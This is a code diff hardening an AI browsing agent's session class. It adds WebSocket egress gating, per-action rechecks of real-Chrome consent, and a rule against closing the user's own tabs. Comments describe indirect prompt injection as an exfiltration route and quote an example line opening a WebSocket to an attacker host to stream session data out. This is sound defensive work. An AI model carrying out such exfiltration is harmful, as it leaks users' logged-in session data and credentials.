@@ -193,6 +193,7 @@ class BrowserSession:
         headless: bool = True,
         nav_timeout_ms: int = 30_000,
         cdp_endpoint: str | None = None,
+        consent_ok: "Callable[[], bool] | None" = None,
     ) -> None:
         self.session_id = session_id
         self.tenant_id = tenant_id
@@ -216,6 +217,9 @@ class BrowserSession:
         # profile — see close(). None = the original launch-own-Chromium mode.
         self._cdp_endpoint = cdp_endpoint
         self._attached = cdp_endpoint is not None
+        # Re-checked on EVERY action for attached sessions (review finding) so an
+        # expired/revoked real-chrome consent stops a live session, not just new ones.
+        self._consent_ok = consent_ok
         # Audit tag stamped on every action so a reviewer can tell real-login
         # (attach) actions apart from sandboxed ones (ADR-0200).
         self._attach_tag = "real-chrome" if self._attached else ""
@@ -378,12 +382,35 @@ class BrowserSession:
         self._context.on("page", self._on_new_page)
         # Network-layer egress enforcement (review HIGH-1). check_egress() gates
         # top-level NAVIGATION, but a loaded page can still fetch()/XHR/beacon/
-        # <img>/WebSocket to ANY host — the real indirect-prompt-injection
-        # exfil vector — with nothing stopping it. Route EVERY request through
-        # the same policy and abort a disallowed one. This also blocks a
-        # subresource fetch to a cloud-metadata endpoint even when no allowlist
-        # is configured (check_egress blocks metadata unconditionally).
+        # <img> to ANY host — the real indirect-prompt-injection exfil vector.
+        # Route EVERY request through the same policy and abort a disallowed one.
+        # This also blocks a subresource fetch to a cloud-metadata endpoint even
+        # when no allowlist is configured (check_egress blocks metadata always).
         await self._context.route("**/*", self._route_egress)
+        # context.route("**/*") does NOT intercept WebSocket handshakes (proven
+        # by adversarial review: a page can new WebSocket('ws://attacker/exfil')
+        # and stream a real logged-in session's data out with check_egress never
+        # running). Gate WS separately — worst-case in attach mode where the tab
+        # holds real credentials. Best-effort: an old Playwright without
+        # route_web_socket logs and leaves HTTP gating in place.
+        try:
+            await self._context.route_web_socket("**/*", self._route_web_socket)
+        except AttributeError:  # pragma: no cover — Playwright < 1.48
+            logger.warning("browser: route_web_socket unavailable — WS egress ungated")
+
+    def _route_web_socket(self, ws) -> None:
+        """Per-WebSocket egress gate. Allowed → proxy to the real server;
+        disallowed (off-allowlist, private/metadata, forbidden) → close. Same
+        policy as _route_egress. Fail-closed: any error closes the socket."""
+        try:
+            if _cmp.check_egress(ws.url, allowlist=self._allowlist,
+                                 forbidden=self._forbidden).allowed:
+                ws.connect_to_server()
+            else:
+                ws.close()
+        except Exception:  # noqa: BLE001 — fail-closed on this one socket
+            with contextlib.suppress(Exception):
+                ws.close()
 
     async def _route_egress(self, route) -> None:
         """Per-request egress gate. In-page pseudo-schemes (data:/blob:/about:)
@@ -441,10 +468,18 @@ class BrowserSession:
             decision = _cmp.check_egress(url, allowlist=self._allowlist, forbidden=self._forbidden)
             host = decision.host
             if not decision.allowed and url not in ("about:blank", ""):
-                await self._safe_close_tab(new_page)
+                # Attach mode (review finding): the tab may be one the USER opened
+                # in their OWN Chrome (their router, a localhost dev server). We
+                # must NOT close their tabs. The request-level route + WS gate
+                # already block its actual network egress, so audit the off-policy
+                # tab but leave it open; only the launched managed browser (whose
+                # every tab is agent-driven) auto-closes it.
+                if not self._attached:
+                    await self._safe_close_tab(new_page)
                 _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
                                   action="new_tab", host=host, ok=False,
-                                  extra={"reason": decision.reason})
+                                  extra={"reason": decision.reason,
+                                         "closed": (not self._attached)})
                 self._emit("new_tab", host=host, ok=False, reason=decision.reason)
                 return
             _cmp.audit_action(self._audit, tenant_id=self.tenant_id, session_id=self.session_id, attach=self._attach_tag,
@@ -537,6 +572,21 @@ class BrowserSession:
                 pass
 
     def _guard_active(self, action: str) -> None:
+        # Per-action consent recheck for attached sessions (review finding): the
+        # real-chrome consent was checked at session CREATE only, so an expired
+        # TTL or an explicit Revoke did NOT stop an already-running session from
+        # driving the user's real Chrome. Now every action re-checks; a lapsed
+        # consent refuses further actions (the session must be re-consented or
+        # closed). Fail-closed: a missing/erroring check refuses.
+        if self._attached and self._consent_ok is not None:
+            try:
+                ok = self._consent_ok()
+            except Exception:  # noqa: BLE001
+                ok = False
+            if not ok:
+                raise BrowserActionError(
+                    "real-chrome consent expired or was revoked — re-grant it in "
+                    "the console (Browser → Attach) or close this session")
         if self.paused:
             raise BrowserActionError(
                 f"blocked: session is paused / under user take-over ({action})")
